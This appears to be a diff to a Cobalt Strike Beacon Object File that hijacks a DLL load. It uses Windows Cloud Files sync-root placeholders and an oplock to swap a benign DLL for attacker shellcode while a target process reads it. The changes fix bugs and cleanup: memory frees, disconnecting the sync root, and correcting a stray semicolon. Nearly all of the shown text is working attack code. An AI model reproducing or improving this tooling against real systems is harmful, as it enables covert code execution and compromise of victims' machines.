@@ -39,6 +39,7 @@ typedef struct oplock {
 
 
 // Acquires a level 1 (aka exclusive) oplock to gpOplockFile and stores the resulting file handle in hOplockFile
+//returns resources that should be closed, cleaned
 BOOL AcquireOplock(HANDLE *hFile, HANDLE *hEvent)
 {
 
@@ -159,7 +160,7 @@ VOID CALLBACK FetchDataCallback (
             gBenignFileAttributes.nFileSizeLow))
 
     {
-        internal_printf( "Switching to payloan");
+        internal_printf( "Switching to payload\n");
         hCurrentFile = hPayloadFile;
 
         internal_printf( "Emptying system working set\n");
@@ -201,7 +202,7 @@ VOID CALLBACK FetchDataCallback (
         // With the payload staged, release the oplock to allow the victim to execute
         ReleaseOplock(CallbackInfo->CallbackContext);
     }
-
+    intFree(buf);
     _ReleaseSRWLockExclusive(&sFetchDataCallback);
 }
 
@@ -213,7 +214,7 @@ BOOL MoveFileWithPrivilege(const wchar_t * src, wchar_t * dest)
     BOOLEAN ignored = 0;
     NTSTATUS ntStatus = 0;
     PFILE_RENAME_INFO pRenameInfo = NULL;
-    void* buf;
+    void* buf = NULL;
     wchar_t ntDest[MAX_PATH] = L"\\??\\";
     GetFNPtr(hntdll, "RtlAdjustPrivilege", _RtlAdjustPrivilege, fpRtlAdjustPrivilege);
     GetFNPtr(hkernel32, "SetFileInformationByHandle", _SetFileInformationByHandle, fpSetFileInformationByHandle);
@@ -264,10 +265,15 @@ Cleanup:
     {
         KERNEL32$CloseHandle(hFile);
     }
+    if (buf)
+    {
+        intFree(buf);
+    }
 
     return bResult;
 }
 
+//checked
 BOOL FileExists(const wchar_t* path)
 {
     return (INVALID_FILE_ATTRIBUTES != KERNEL32$GetFileAttributesW(path));
@@ -383,9 +389,14 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     char* payloadBuf;
     BOOL registered = FALSE;
     BOOL linked = FALSE;
+    BOOL connected = FALSE;
     oplock* op = intAlloc(sizeof(oplock));
     GetFNPtr(hkernel32, "CreateDirectoryW", _CreateDirectoryW, fpCreateDirectoryW);
-   
+    GetFNPtr(hcldapi, "CfConnectSyncRoot", _CfConnectSyncRoot, fpCfConnectSyncRoot);
+    GetFNPtr(hcldapi, "CfUnregisterSyncRoot", _CfUnregisterSyncRoot, fpCfUnregisterSyncRoot);
+    GetFNPtr(hcldapi, "CfRegisterSyncRoot", _CfRegisterSyncRoot, fpCfRegisterSyncRoot);
+    GetFNPtr(hkernel32, "WriteFile", _WriteFile, fpWriteFile);
+    GetFNPtr(hcldapi, "CfDisconnectSyncRoot", _CfDisconnectSyncRoot, fpCfDisconnectSyncRoot);
     // Handle verbose logging
 
     // Extract args
@@ -422,7 +433,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
         BeaconPrintf(CALLBACK_ERROR, "Failed to build payload");
         goto Cleanup;
     }
-    GetFNPtr(hkernel32, "WriteFile", _WriteFile, fpWriteFile);
+
 
     if (!_WriteFile(hPayloadFile, payloadBuf, (DWORD)payloadLen, &bytesWritten, NULL) ||
         (bytesWritten != payloadLen))
@@ -448,7 +459,7 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     policies.InSync = CF_INSYNC_POLICY_NONE;
     policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
     policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
-    GetFNPtr(hcldapi, "CfRegisterSyncRoot", _CfRegisterSyncRoot, fpCfRegisterSyncRoot);
+
 
     hRet = _CfRegisterSyncRoot(PLACEHOLDER_DLL_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
     if (!SUCCEEDED(hRet))
@@ -467,14 +478,14 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode,
     cbReg[0].Callback = FetchDataCallback;
     cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
     cbReg[1].Type = CF_CALLBACK_TYPE_NONE;
-    GetFNPtr(hcldapi, "CfConnectSyncRoot", _CfConnectSyncRoot, fpCfConnectSyncRoot);
-    GetFNPtr(hcldapi, "CfUnregisterSyncRoot", _CfUnregisterSyncRoot, fpCfUnregisterSyncRoot);
+
     hRet = _CfConnectSyncRoot(PLACEHOLDER_DLL_DIR, cbReg, op, CF_CONNECT_FLAG_NONE, &gConnectionKey);
     if (!SUCCEEDED(hRet))
     {
         BeaconPrintf(CALLBACK_ERROR, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
         goto Cleanup;
     }
+    connected = TRUE;
     GetFNPtr(hkernel32, "GetFileAttributesExW", _GetFileAttributesExW, fpGetFileAttributesExW);
     if (!_GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
     {
@@ -581,8 +592,14 @@ Cleanup:
         KERNEL32$CloseHandle(hBenignFile);
     ReleaseOplock(op);
     KERNEL32$Sleep(100);
-    if (registered);
-    _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
+    if (connected)
+    {
+        _CfDisconnectSyncRoot(gConnectionKey);
+    }
+    if (registered)
+    {
+        _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
+    }
     if (linked);
     CleanupSymlink();
     intFree(op);
